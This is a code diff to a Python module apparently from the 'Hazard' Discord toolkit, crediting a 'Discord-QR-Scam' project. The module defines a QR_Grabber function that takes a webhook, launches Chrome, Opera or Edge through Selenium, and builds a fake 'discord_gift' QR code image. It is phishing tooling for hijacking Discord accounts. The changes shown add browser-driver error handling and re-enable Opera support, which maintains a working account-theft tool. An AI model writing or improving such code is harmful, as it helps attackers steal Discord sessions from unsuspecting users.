@@ -5,22 +5,22 @@
 #Cred/inspiration goes to https://github.com/NightfallGT/Discord-QR-Scam
 
 
-import requests
 import os
 import sys
 import json
 import base64
 import Hazard
+import requests
 
 from PIL import Image
 from zipfile import ZipFile
 from time import sleep
 from urllib.request import urlretrieve
-from selenium import webdriver
+from selenium import webdriver, common
 from bs4 import BeautifulSoup
 from colorama import Fore
 
-from util.plugins.common import get_driver, getheaders
+from util.plugins.common import getDriver, getheaders, SlowPrint
 
 def logo_qr():
     #Paste the discord logo onto the QR code
@@ -37,23 +37,44 @@ def paste_template():
     im1.save('QR-Code/discord_gift.png', quality=95)
 
 def QR_Grabber(Webhook):
-    type_ = get_driver()
+    type_ = getDriver()
 
     if type_ == "chromedriver.exe":
         opts = webdriver.ChromeOptions()
         opts.add_experimental_option('excludeSwitches', ['enable-logging'])
         opts.add_experimental_option("detach", True)
-        driver = webdriver.Chrome(options=opts)
-    # elif type_ == "operadriver.exe":
-    #     opts = webdriver.opera.options.ChromeOptions()
-    #     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
-    #     opts.add_experimental_option("detach", True)
-    #     driver = webdriver.Opera(options=opts)
+        try:
+            driver = webdriver.Chrome(options=opts)
+        except common.exceptions.SessionNotCreatedException as e:
+            print(e.msg)
+            sleep(2)
+            SlowPrint("Enter anything to continue. . . ")
+            input()
+            Hazard.main()
+    elif type_ == "operadriver.exe":
+        opts = webdriver.opera.options.ChromeOptions()
+        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
+        opts.add_experimental_option("detach", True)
+        try:
+            driver = webdriver.Opera(options=opts)
+        except common.exceptions.SessionNotCreatedException as e:
+            print(e.msg)
+            sleep(2)
+            SlowPrint("Enter anything to continue. . . ")
+            input()
+            Hazard.main()
     elif type_ == "msedgedriver.exe":
         opts = webdriver.EdgeOptions()
         opts.add_experimental_option('excludeSwitches', ['enable-logging'])
         opts.add_experimental_option("detach", True)
-        driver = webdriver.Edge(options=opts)
+        try:
+            driver = webdriver.Edge(options=opts)
+        except common.exceptions.SessionNotCreatedException as e:
+            print(e.msg)
+            sleep(2)
+            SlowPrint(f"Enter anything to continue. . .")
+            input()
+            Hazard.main()
     else:
         print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a driver to create a QR code with')
         sleep(3)
